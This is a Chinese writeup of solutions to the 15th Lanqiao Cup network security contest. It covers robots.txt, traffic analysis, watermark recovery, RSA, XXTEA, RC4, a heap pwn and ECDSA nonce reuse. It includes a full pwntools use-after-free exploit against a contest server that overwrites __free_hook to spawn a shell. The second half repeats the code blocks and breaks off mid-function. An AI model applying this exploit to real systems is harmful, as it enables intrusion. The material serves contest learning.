# 第十五届蓝桥杯大赛网络安全赛项个人赛Writeup

> 原文: https://www.ctfiot.com/176353.html
> ID: 176353

爬虫协议

题目内容：

小蓝同学在开发网站时了解到了一个爬虫协议，该协议指网站可建立一个特别的txt文件来告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取该txt文件来识别这个页面是否允许被抓取。爬虫协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。

根据提示找robots.txt文件

跟进第三个路径

查看文件，得到flag

packet

直接ctrl+F，找flag

追踪流，找到加密的flag

解码得到flag{7d6f17a4-2b0a-467d-8a42-66750368c249}

缺失的数据

打开附件就看到一个压缩包，里面有secret.txt文件，用工具套上字典，爆破压缩包密码。密码为pavilion

解压得到a.png

看给的脚本lose.py，有加水印也有解水印代码。仿写

import cv2
import pywt
import numpy as np
import matplotlib.pyplot as plt

class WaterMarkDWT:
    def __init__(self, origin: str, watermark: str, key: int, weight: list):
        self.key = key
        self.img = cv2.imread(origin)
        self.mark = cv2.imread(watermark)
        self.coef = weight
        
    def arnold(self, img):
        r, c = img.shape
        p = np.zeros((r, c), np.uint8)
        a, b = 1, 1
        for k in range(self.key):
            for i in range(r):
                for j in range(c):  
                    x = (i + b * j) % r
                    y = (a * i + (a * b + 1) * j) % c
                    p[x, y] = img[i, j]
        return p
 
    def deArnold(self, img):
        r, c = img.shape
        p = np.zeros((r, c), np.uint8)
        a, b = 1, 1
        for k in range(self.key):
            for i in range(r):
                for j in range(c): 
                        x = ((a * b + 1) * i - b * j) % r
                        y = (-a * i + j) % c
                        p[x, y] = img[i, j]
        return p
 
    def get(self, size: tuple = (1200, 1200), flag: int = None):
        img = cv2.resize(self.img, size)
        img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY)
        img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY)
        c = pywt.wavedec2(img2, 'db2', level=3)
        [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c
        d = pywt.wavedec2(img1, 'db2', level=3)
        [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d
        a1, a2, a3, a4 = self.coef
        ca1 = (cl - dl) * a1
        ch1 = (cH3 - dH3) * a2
        cv1 = (cV3 - dV3) * a3
        cd1 = (cD3 - dD3) * a4
        waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], 'db2')
        waterImg = np.array(waterImg, np.uint8)
        waterImg = self.deArnold(waterImg)
        kernel = np.ones((3, 3), np.uint8)
        if flag == 0:
            waterImg = cv2.erode(waterImg, kernel)
        elif flag == 1:
            waterImg = cv2.dilate(waterImg, kernel)
        cv2.imwrite('水印.png', waterImg)
        return waterImg

if __name__ == '__main__':
    img = 'D:\Desktop\2024蓝桥杯网络安全\lose_7635c918b7960acb64e457b810a87af1\a.png'
    k = 20
    # xs = [0.2, 0.2, 0.5, 0.4]
    # W1 = WaterMarkDWT(img, waterImg, k, xs)
    newImg = 'D:\Desktop\2024蓝桥杯网络安全\lose_7635c918b7960acb64e457b810a87af1\newImg.png'
    _coef = [5, 5, 1, 2]
    W2 = WaterMarkDWT(img, newImg, k, _coef)
    wmark = W2.get()

运行完成后生成姘村嵃.png

cc

打开看到给了加密方式和密文

直接解密

Theorem

非预期解，n可以直接用yafu进行分解

E:
CTF实例ReverseRSAyafu-1.34>yafu-x64.exe "factor(94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791)"

fac: factoring 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791
fac: using pretesting plan: normal
fac: no tune info: using qs/gnfs crossover of 95 digits
div: primes less than 10000
fmt: 1000000 iterations
Total factoring time = 0.5512 seconds

***factors found***

P154 = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156923
P154 = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156717

ans = 1

直接解密

from Crypto.Util.number import *
from gmpy2 import *

n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791
p = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156923
q = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156717
c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829
e = 65537

phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
# flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a}

预期解

from Cryptodome.Util.number import long_to_bytes
import gmpy2

n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791
d1 = 4218387668018915625720266396593862419917073471510522718205354605765842130260156168132376152403329034145938741283222306099114824746204800218811277063324566
d2 = 9600627113582853774131075212313403348273644858279673841760714353580493485117716382652419880115319186763984899736188607228846934836782353387850747253170850
c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829
e = 65537

p = gmpy2.next_prime(gmpy2.isqrt(n))
q = n // p

phi = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi)

mp = pow(c, d % (p-1), p)
mq = pow(c, d % (q-1), q)
a = gmpy2.invert(p, q)
b = gmpy2.invert(q, p)
tmp1 = mp * p * a
tmp2 = mq * q * b
m = (tmp1 + tmp2) % (p * q)
print(long_to_bytes(m))

# flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a}

欢乐时光

ida64

进cry函数，是一个xxtea加密

逆向脚本，套用xxtea解密模板，只需要修改rounds的值即可

from ctypes import *

def MX(z, y, total, key, p, e):
    temp1 = (z.value>>5 ^ y.value<<2) + (y.value>>3 ^ z.value<<4)
    temp2 = (total.value ^ y.value) + (key[(p&3) ^ e.value] ^ z.value)
    
    return c_uint32(temp1 ^ temp2)

def decrypt(n, v, key):
    delta = 0x61C88647
    rounds = int((415 / n) + 114) # 魔改的位置1
    
    total = c_uint32(0 - rounds * delta) # 魔改的位置2
    y = c_uint32(v[0])
    e = c_uint32(0)

    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = c_uint32(v[p-1])
            v[p] = c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value
            y.value = v[p]
        z = c_uint32(v[n-1])  
        v[0] = c_uint32(v[0] - MX(z,y,total,key,0,e).value).value
        y.value = v[0]  
        total.value += delta # 魔改的位置3
        rounds -= 1

    return v 

if __name__ == "__main__":
    v = [0x480AC20C, 0xCE9037F2, 0x8C212018, 0x0E92A18D, 0xA4035274, 0x2473AAB1, 0xA9EFDB58, 0xA52CC5C8, 0xE432CB51, 0xD04E9223, 0x6FD07093]
    k = [0x79696755, 0x67346F6C, 0x69231231, 0x5F674231]
    n = 11 # 魔改的位置4

    res = decrypt(n, v, k)
    for i in res:
        print(str(i.to_bytes(4, 'little'))[2:-1], end='')
        
# flag{efccf8f0-0c97-12ec-82e0-0c9d9242e335}

rc4

idax32

int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+50h] [ebp-3Ch]
  char v5[44]; // [esp+54h] [ebp-38h] BYREF
  char Str[12]; // [esp+80h] [ebp-Ch] BYREF

  strcpy(Str, "gamelab@");
  v5[0] = -74;
  v5[1] = 66;
  v5[2] = -73;
  v5[3] = -4;
  v5[4] = -16;
  v5[5] = -94;
  v5[6] = 94;
  v5[7] = -87;
  v5[8] = 61;
  v5[9] = 41;
  v5[10] = 54;
  v5[11] = 31;
  v5[12] = 84;
  v5[13] = 41;
  v5[14] = 114;
  v5[15] = -88;
  v5[16] = 99;
  v5[17] = 50;
  v5[18] = -14;
  v5[19] = 68;
  v5[20] = -117;
  v5[21] = -123;
  v5[22] = -20;
  v5[23] = 13;
  v5[24] = -83;
  v5[25] = 63;
  v5[26] = -109;
  v5[27] = -93;
  v5[28] = -110;
  v5[29] = 116;
  v5[30] = -127;
  v5[31] = 101;
  v5[32] = 105;
  v5[33] = -20;
  v5[34] = -28;
  v5[35] = 57;
  v5[36] = -123;
  v5[37] = -87;
  v5[38] = -54;
  v5[39] = -81;
  v5[40] = -78;
  v5[41] = 0xC6;
  v4 = strlen(Str);
  sub_401005((int)Str, v4, (int)v5, 42);
  printf("%sn", Str);
  return 0;
}

分析sub_401005函数

int __cdecl sub_401020(int a1, unsigned int a2, int a3, unsigned int a4)
{
  int result; // eax
  unsigned int k; // [esp+4Ch] [ebp-210h]
  char v6; // [esp+50h] [ebp-20Ch]
  char v7; // [esp+50h] [ebp-20Ch]
  unsigned int v8; // [esp+54h] [ebp-208h]
  unsigned int v9; // [esp+54h] [ebp-208h]
  unsigned int i; // [esp+58h] [ebp-204h]
  unsigned int j; // [esp+58h] [ebp-204h]
  unsigned int v12; // [esp+58h] [ebp-204h]
  char v13[512]; // [esp+5Ch] [ebp-200h]

  for ( i = 0; i < 0x100; ++i )
  {
    v13[i + 256] = i;
    v13[i] = *(_BYTE *)(a1 + i % a2);
  }
  v8 = 0;
  for ( j = 0; j < 0x100; ++j )
  {
    v8 = ((unsigned __int8)v13[j] + (unsigned __int8)v13[j + 256] + v8) % 0x100;
    v6 = v13[j + 256];
    v13[j + 256] = v13[v8 + 256];
    v13[v8 + 256] = v6;
  }
  v9 = 0;
  result = 0;
  v12 = 0;
  for ( k = 0; k < a4; ++k )
  {
    v12 = (v12 + 1) % 0x100;
    v9 = (v9 + (unsigned __int8)v13[v12 + 256]) % 0x100;
    v7 = v13[v12 + 256];
    v13[v12 + 256] = v13[v9 + 256];
    v13[v9 + 256] = v7;
    result = (unsigned __int8)v13[v9 + 256];
    LOBYTE(result) = v13[(result + (unsigned __int8)v13[v12 + 256]) % 256 + 256] ^ *(_BYTE *)(k + a3);
    *(_BYTE *)(k + a3) = result;
  }
  return result;
}

是一个RC4，密钥是gamelab@，解密脚本，套用RC4解密模板

def KSA(key):
    key_length = len(key)

    # 初始化S盒
    S = list(range(256))

    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]  # 交换S[i]和S[j]

    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # 交换S[i]和S[j]
        K = S[(S[i] + S[j]) % 256]
        yield K

def RC4(key):
    S = KSA(key)
    keystream = PRGA(S)
    return keystream

# 使用示例
if __name__ == '__main__':
    key = 'gamelab@'
    plaintext = [0xB6, 0x42, 0xB7, 0xFC, 0xF0, 0xA2, 0x5E, 0xA9, 0x3D, 0x29, 0x36, 0x1F, 0x54, 0x29, 0x72, 0xA8, 0x63, 0x32, 0xF2, 0x44, 0x8B, 0x85, 0xEC, 0x0D, 0xAD, 0x3F, 0x93, 0xA3, 0x92, 0x74, 0x81, 0x65, 0x69, 0xEC, 0xE4, 0x39, 0x85, 0xA9, 0xCA, 0xAF, 0xB2, 0xC6]

    # 转换为字节流
    key = key.encode()
    # plaintext = plaintext.encode()

    # 生成密钥流
    keystream = RC4(key)

    # 加密
    ciphertext = []
    for b in plaintext:
        ciphertext.append(chr(b ^ next(keystream)))  # 异或操作
    print("".join(ciphertext))
    
# flag{12601b2b-2f1e-468a-ae43-92391ff76ef3}

ezheap

题目内容：

小蓝同学第二次尝试使用C语言编写程序时，由于缺乏良好的安全开发经验和习惯，导致了未初始化的指针漏洞（Use After Free，UAF漏洞）。在他的程序中，他没有正确释放动态分配的内存空间，并且在之后继续使用了已经释放的指针，造成了悬空指针的问题。这种错误会导致程序在运行时出现未定义的行为，可能被恶意利用来执行恶意代码，破坏数据或者系统安全性。你能找到该漏洞并利用成功吗？

idax64

分析main函数，菜单题

分析漏洞函数，可以看到当input == 0x202405，存在UAF漏洞，只能利用一次。

思路：

通过正常的释放，重新申请把heap地址泄露，然后通过填充tache满对应的0x60的bin，使之进入fastbin，然后绕过对tache重复释放的检测。通过风水布局，释放一个0x430大小的heap，得到libc地址，在通过堆叠进行控制fd的值，指向free_hook，修改其为system，然后我们释放/bin/shx00字符就可以getshell。

exp

from pwn import *
context(arch='i386', os='linux', log_level="debug")
libc = ELF("./libc.so.6")

def connect_to_remote():
    p = remote("47.93.142.153", 13434)
    return p

def add_item(p, content):
    p.sendlineafter("4.exit", '1')
    sleep(0.2)
    p.send(content)

def delete_item(p, idx):
    p.sendlineafter("4.exit", '2')
    sleep(0.2)
    p.sendline(str(idx))

def show_item(p, idx):
    p.sendlineafter("4.exit", '3')
    sleep(0.2)
    p.recv()
    p.sendline(str(idx))

def exploit_system():
    p = connect_to_remote()

    for i in range(11):
        add_item(p, "AAAAAA")
    add_item(p, p64(0) * 4 + p64(0) + p64(0x31))

    delete_item(p, 0)
    delete_item(p, 1)

    add_item(p, "xa0")
    add_item(p, "xa0")
    show_item(p, 0)

    heap_base = u64(p.recv(6).ljust(0x8, b"x00")) - 0x2a0

    for i in range(7):
        delete_item(p, 2 + i)

    p.sendlineafter("4.exit", str(0x202405))
    delete_item(p, 1)
    delete_item(p, 0)

    for i in range(7):
        add_item(p, "AAAAAA")

    add_item(p, p64(heap_base + 0x2c0))
    add_item(p, p64(0) * 3 + p64(0x431))
    add_item(p, p64(0) * 3 + p64(0x431))
    add_item(p, p64(0) * 3 + p64(0x431))

    delete_item(p, 13)

    add_item(p, "xe0")
    show_item(p, 13)

    libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8, b"x00")) - 0x1ecbe0 - 0x400
    free_hook = libc.sym['__free_hook']
    system = libc.sym['system']

    delete_item(p, 11)
    delete_item(p, 12)
    delete_item(p, 13)
    add_item(p, b"x00" * 0x38 + p64(0x61) + p64(free_hook))
    add_item(p, b"/bin/shx00")
    add_item(p, p64(system))
    delete_item(p, 12)

    p.interactive()

exploit_system()

signature

题目内容：

椭圆曲线数字签名算法，它利用椭圆曲线密码学（ECC）对数字签名算法（DSA）进行模拟，其安全性基于椭圆曲线离散对数问题。但是当某些数值相同时会出现一些安全问题。

题目代码

import ecdsa
import random

def ecdsa_test(dA,k):

    sk = ecdsa.SigningKey.from_secret_exponent(
        secexp=dA,
        curve=ecdsa.SECP256k1
    )
    sig1 = sk.sign(data=b'Hi.', k=k).hex()
    sig2 = sk.sign(data=b'hello.', k=k).hex()

    r1 = int(sig1[:64], 16)
    s1 = int(sig1[64:], 16)
    s2 = int(sig2[64:], 16)
    return r1,s1,s2

if __name__ == '__main__':
    n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
    a = random.randint(0,n)
    flag = 'flag{' + str(a) + "}"
    b = random.randint(0,n)
    print(ecdsa_test(a,b))

# (4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254)

分析代码可以看出，存在随机数重复使用。具体来说，这段代码中签名的过程中使用了相同的随机数 k 来对不同的消息进行签名。这种情况下，可以通过分析两个相同 k 值对应的消息签名来恢复私钥 dA。

在 ECDSA 中，每次签名过程中都会使用一个随机数 k，以确保生成唯一的签名。然而，如果相同的随机数 k 被重复使用来对不同的消息进行签名，攻击者就有可能通过数学分析和推导计算出私钥 dA。

解密脚本

import sympy
from hashlib import sha1
from Cryptodome.Util.number import long_to_bytes , bytes_to_long

def calculate_private_key(r1, s1, s2, h1, h2, n):
    # 计算k值
    k = ((h1 - h2) * sympy.mod_inverse(s1 - s2, n)) % n
    # 计算私钥dA
    dA = (sympy.mod_inverse(r1, n) * (k * s1 - h1)) % n
    return dA

if __name__ == "__main__":
    # 定义椭圆曲线的参数
    n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
    # 签名中的r1, s1, s2值
    r1 = 4690192503304946823926998585663150874421527890534303129755098666293734606680
    s1 = 111157363347893999914897601390136910031659525525419989250638426589503279490788
    s2 = 74486305819584508240056247318325239805160339288252987178597122489325719901254
    h1 = bytes_to_long(sha1(b'Hi.').digest())
    h2 = bytes_to_long(sha1(b'hello.').digest())
    private_key = calculate_private_key(r1, s1, s2, h1, h2, n)
    print(f'flag{{{private_key}}}')

# flag{40355055231406097504270940121798355439363616832290875140843417522164091270174}


```
import cv2
import pywt
import numpy as np
import matplotlib.pyplot as plt

class WaterMarkDWT:
    def __init__(self, origin: str, watermark: str, key: int, weight: list):
        self.key = key
        self.img = cv2.imread(origin)
        self.mark = cv2.imread(watermark)
        self.coef = weight
        
    def arnold(self, img):
        r, c = img.shape
        p = np.zeros((r, c), np.uint8)
        a, b = 1, 1
        for k in range(self.key):
            for i in range(r):
                for j in range(c):  
                    x = (i + b * j) % r
                    y = (a * i + (a * b + 1) * j) % c
                    p[x, y] = img[i, j]
        return p
 
    def deArnold(self, img):
        r, c = img.shape
        p = np.zeros((r, c), np.uint8)
        a, b = 1, 1
        for k in range(self.key):
            for i in range(r):
                for j in range(c): 
                        x = ((a * b + 1) * i - b * j) % r
                        y = (-a * i + j) % c
                        p[x, y] = img[i, j]
        return p
 
    def get(self, size: tuple = (1200, 1200), flag: int = None):
        img = cv2.resize(self.img, size)
        img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY)
        img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY)
        c = pywt.wavedec2(img2, 'db2', level=3)
        [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c
        d = pywt.wavedec2(img1, 'db2', level=3)
        [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d
        a1, a2, a3, a4 = self.coef
        ca1 = (cl - dl) * a1
        ch1 = (cH3 - dH3) * a2
        cv1 = (cV3 - dV3) * a3
        cd1 = (cD3 - dD3) * a4
        waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], 'db2')
        waterImg = np.array(waterImg, np.uint8)
        waterImg = self.deArnold(waterImg)
        kernel = np.ones((3, 3), np.uint8)
        if flag == 0:
            waterImg = cv2.erode(waterImg, kernel)
        elif flag == 1:
            waterImg = cv2.dilate(waterImg, kernel)
        cv2.imwrite('水印.png', waterImg)
        return waterImg

if __name__ == '__main__':
    img = 'D:\Desktop\2024蓝桥杯网络安全\lose_7635c918b7960acb64e457b810a87af1\a.png'
    k = 20
    # xs = [0.2, 0.2, 0.5, 0.4]
    # W1 = WaterMarkDWT(img, waterImg, k, xs)
    newImg = 'D:\Desktop\2024蓝桥杯网络安全\lose_7635c918b7960acb64e457b810a87af1\newImg.png'
    _coef = [5, 5, 1, 2]
    W2 = WaterMarkDWT(img, newImg, k, _coef)
    wmark = W2.get()
E:
CTF实例ReverseRSAyafu-1.34>yafu-x64.exe "factor(94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791)"

fac: factoring 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791
fac: using pretesting plan: normal
fac: no tune info: using qs/gnfs crossover of 95 digits
div: primes less than 10000
fmt: 1000000 iterations
Total factoring time = 0.5512 seconds

***factors found***

P154 = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156923
P154 = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156717

ans = 1
from Crypto.Util.number import *
from gmpy2 import *

n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791
p = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156923
q = 9725277820345294029015692786209306694836079927617586357442724339468673996231042839233529246844794558371350733017150605931603344334330882328076640690156717
c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829
e = 65537

phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
# flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a}
from Cryptodome.Util.number import long_to_bytes
import gmpy2

n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791
d1 = 4218387668018915625720266396593862419917073471510522718205354605765842130260156168132376152403329034145938741283222306099114824746204800218811277063324566
d2 = 9600627113582853774131075212313403348273644858279673841760714353580493485117716382652419880115319186763984899736188607228846934836782353387850747253170850
c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829
e = 65537

p = gmpy2.next_prime(gmpy2.isqrt(n))
q = n // p

phi = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi)

mp = pow(c, d % (p-1), p)
mq = pow(c, d % (q-1), q)
a = gmpy2.invert(p, q)
b = gmpy2.invert(q, p)
tmp1 = mp * p * a
tmp2 = mq * q * b
m = (tmp1 + tmp2) % (p * q)
print(long_to_bytes(m))

# flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a}
from ctypes import *

def MX(z, y, total, key, p, e):
    temp1 = (z.value>>5 ^ y.value<<2) + (y.value>>3 ^ z.value<<4)
    temp2 = (total.value ^ y.value) + (key[(p&3) ^ e.value] ^ z.value)
    
    return c_uint32(temp1 ^ temp2)

def decrypt(n, v, key):
    delta = 0x61C88647
    rounds = int((415 / n) + 114) # 魔改的位置1
    
    total = c_uint32(0 - rounds * delta) # 魔改的位置2
    y = c_uint32(v[0])
    e = c_uint32(0)

    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = c_uint32(v[p-1])
            v[p] = c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value
            y.value = v[p]
        z = c_uint32(v[n-1])  
        v[0] = c_uint32(v[0] - MX(z,y,total,key,0,e).value).value
        y.value = v[0]  
        total.value += delta # 魔改的位置3
        rounds -= 1

    return v 

if __name__ == "__main__":
    v = [0x480AC20C, 0xCE9037F2, 0x8C212018, 0x0E92A18D, 0xA4035274, 0x2473AAB1, 0xA9EFDB58, 0xA52CC5C8, 0xE432CB51, 0xD04E9223, 0x6FD07093]
    k = [0x79696755, 0x67346F6C, 0x69231231, 0x5F674231]
    n = 11 # 魔改的位置4

    res = decrypt(n, v, k)
    for i in res:
        print(str(i.to_bytes(4, 'little'))[2:-1], end='')
        
# flag{efccf8f0-0c97-12ec-82e0-0c9d9242e335}
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+50h] [ebp-3Ch]
  char v5[44]; // [esp+54h] [ebp-38h] BYREF
  char Str[12]; // [esp+80h] [ebp-Ch] BYREF

  strcpy(Str, "gamelab@");
  v5[0] = -74;
  v5[1] = 66;
  v5[2] = -73;
  v5[3] = -4;
  v5[4] = -16;
  v5[5] = -94;
  v5[6] = 94;
  v5[7] = -87;
  v5[8] = 61;
  v5[9] = 41;
  v5[10] = 54;
  v5[11] = 31;
  v5[12] = 84;
  v5[13] = 41;
  v5[14] = 114;
  v5[15] = -88;
  v5[16] = 99;
  v5[17] = 50;
  v5[18] = -14;
  v5[19] = 68;
  v5[20] = -117;
  v5[21] = -123;
  v5[22] = -20;
  v5[23] = 13;
  v5[24] = -83;
  v5[25] = 63;
  v5[26] = -109;
  v5[27] = -93;
  v5[28] = -110;
  v5[29] = 116;
  v5[30] = -127;
  v5[31] = 101;
  v5[32] = 105;
  v5[33] = -20;
  v5[34] = -28;
  v5[35] = 57;
  v5[36] = -123;
  v5[37] = -87;
  v5[38] = -54;
  v5[39] = -81;
  v5[40] = -78;
  v5[41] = 0xC6;
  v4 = strlen(Str);
  sub_401005((int)Str, v4, (int)v5, 42);
  printf("%sn", Str);
  return 0;
}
int __cdecl sub_401020(int a1, unsigned int a2, int a3, unsigned int a4)
{
  int result; // eax
  unsigned int k; // [esp+4Ch] [ebp-210h]
  char v6; // [esp+50h] [ebp-20Ch]
  char v7; // [esp+50h] [ebp-20Ch]
  unsigned int v8; // [esp+54h] [ebp-208h]
  unsigned int v9; // [esp+54h] [ebp-208h]
  unsigned int i; // [esp+58h] [ebp-204h]
  unsigned int j; // [esp+58h] [ebp-204h]
  unsigned int v12; // [esp+58h] [ebp-204h]
  char v13[512]; // [esp+5Ch] [ebp-200h]

  for ( i = 0; i < 0x100; ++i )
  {
    v13[i + 256] = i;
    v13[i] = *(_BYTE *)(a1 + i % a2);
  }
  v8 = 0;
  for ( j = 0; j < 0x100; ++j )
  {
    v8 = ((unsigned __int8)v13[j] + (unsigned __int8)v13[j + 256] + v8) % 0x100;
    v6 = v13[j + 256];
    v13[j + 256] = v13[v8 + 256];
    v13[v8 + 256] = v6;
  }
  v9 = 0;
  result = 0;
  v12 = 0;
  for ( k = 0; k < a4; ++k )
  {
    v12 = (v12 + 1) % 0x100;
    v9 = (v9 + (unsigned __int8)v13[v12 + 256]) % 0x100;
    v7 = v13[v12 + 256];
    v13[v12 + 256] = v13[v9 + 256];
    v13[v9 + 256] = v7;
    result = (unsigned __int8)v13[v9 + 256];
    LOBYTE(result) = v13[(result + (unsigned __int8)v13[v12 + 256]) % 256 + 256] ^ *(_BYTE *)(k + a3);
    *(_BYTE *)(k + a3) = result;
  }
  return result;
}
def KSA(key):
    key_length = len(key)

    # 初始化S盒
    S = list(range(256))

    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]  # 交换S[i]和S[j]

    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # 交换S[i]和S[j]
        K = S[(S[i] + S[j]) % 256]
        yield K

def RC4(key):
    S = KSA(key)
    keystream = PRGA(S)
    return keystream

# 使用示例
if __name__ == '__main__':
    key = 'gamelab@'
    plaintext = [0xB6, 0x42, 0xB7, 0xFC, 0xF0, 0xA2, 0x5E, 0xA9, 0x3D, 0x29, 0x36, 0x1F, 0x54, 0x29, 0x72, 0xA8, 0x63, 0x32, 0xF2, 0x44, 0x8B, 0x85, 0xEC, 0x0D, 0xAD, 0x3F, 0x93, 0xA3, 0x92, 0x74, 0x81, 0x65, 0x69, 0xEC, 0xE4, 0x39, 0x85, 0xA9, 0xCA, 0xAF, 0xB2, 0xC6]

    # 转换为字节流
    key = key.encode()
    # plaintext = plaintext.encode()

    # 生成密钥流
    keystream = RC4(key)

    # 加密
    ciphertext = []
    for b in plaintext:
        ciphertext.append(chr(b ^ next(keystream)))  # 异或操作
    print("".join(ciphertext))
    
# flag{12601b2b-2f1e-468a-ae43-92391ff76ef3}
from pwn import *
context(arch='i386', os='linux', log_level="debug")
libc = ELF("./libc.so.6")

def connect_to_remote():
    p = remote("47.93.142.153", 13434)
    return p

def add_item(p, content):
    p.sendlineafter("4.exit", '1')
    sleep(0.2)
    p.send(content)

def delete_item(p, idx):
    p.sendlineafter("4.exit", '2')
    sleep(0.2)
    p.sendline(str(idx))

def show_item(p, idx):
    p.sendlineafter("4.exit", '3')
    sleep(0.2)
    p.recv()
    p.sendline(str(idx))

def exploit_system():
    p = connect_to_remote()

    for i in range(11):
        add_item(p, "AAAAAA")
    add_item(p, p64(0) * 4 + p64(0) + p64(0x31))

    delete_item(p, 0)
    delete_item(p, 1)

    add_item(p, "xa0")
    add_item(p, "xa0")
    show_item(p, 0)

    heap_base = u64(p.recv(6).ljust(0x8, b"x00")) - 0x2a0

    for i in range(7):
        delete_item(p, 2 + i)

    p.sendlineafter("4.exit", str(0x202405))
    delete_item(p, 1)
    delete_item(p, 0)

    for i in range(7):
        add_item(p, "AAAAAA")

    add_item(p, p64(heap_base + 0x2c0))
    add_item(p, p64(0) * 3 + p64(0x431))
    add_item(p, p64(0) * 3 + p64(0x431))
    add_item(p, p64(0) * 3 + p64(0x431))

    delete_item(p, 13)

    add_item(p, "xe0")
    show_item(p, 13)

    libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8, b"x00")) - 0x1ecbe0 - 0x400
    free_hook = libc.sym['__free_hook']
    system = libc.sym['system']

    delete_item(p, 11)
    delete_item(p, 12)
    delete_item(p, 13)
    add_item(p, b"x00" * 0x38 + p64(0x61) + p64(free_hook))
    add_item(p, b"/bin/shx00")
    add_item(p, p64(system))
    delete_item(p, 12)

    p.interactive()

exploit_system()
import ecdsa
import random

def ecdsa_test(dA,k):

